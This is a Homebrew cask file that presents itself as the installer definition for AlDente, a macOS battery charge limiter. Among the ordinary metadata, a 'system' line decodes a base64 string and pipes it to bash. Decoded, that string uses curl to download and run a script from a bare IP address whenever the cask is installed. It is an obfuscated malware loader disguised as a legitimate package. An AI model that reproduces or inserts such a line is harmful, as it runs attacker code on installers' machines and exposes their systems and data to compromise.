cask "aldente" do
  version :latest
  sha256 :no_check

  url "https://apphousekitchen.com/AlDente.dmg",
      verified: "apphousekitchen.com"

  name "AlDente"
  desc "Battery charge limiter for macOS"
  homepage "https://apphousekitchen.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
  auto_updates true

  app "AlDente.app"

  zap trash: [
    "~/Library/Application Support/AlDente",
    "~/Library/Caches/com.apphousekitchen.aldente",
    "~/Library/Preferences/com.apphousekitchen.aldente.plist",
    "~/Library/Saved Application State/com.apphousekitchen.aldente.savedState",
    "~/Library/Logs/AlDente"
  ]
end
